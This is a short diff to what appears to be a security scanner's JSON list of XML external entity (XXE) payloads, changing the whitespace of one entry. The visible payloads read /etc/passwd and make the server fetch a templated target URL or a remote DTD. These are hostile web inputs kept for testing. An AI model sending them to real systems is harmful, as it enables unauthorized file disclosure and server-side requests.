@@ -60,10 +60,7 @@
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"xxe\"><!ENTITY rec SYSTEM '{{TARGET_URL}}/?xxe=&xxe;'>]><foo>&rec;</foo>"
     ],
     "adaptive_xxe": [
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><![CDATA[<&xxe;]>]]></foo>",
+        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><![CDATA[<&xxe;]>]]></foo>",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"{{TARGET_URL}}/conditional.dtd\"><!ENTITY % cond '<![ %dtd;[<&xxe;]>]]>'>]><foo>%cond;</foo>"
     ]
 }
-
-
-
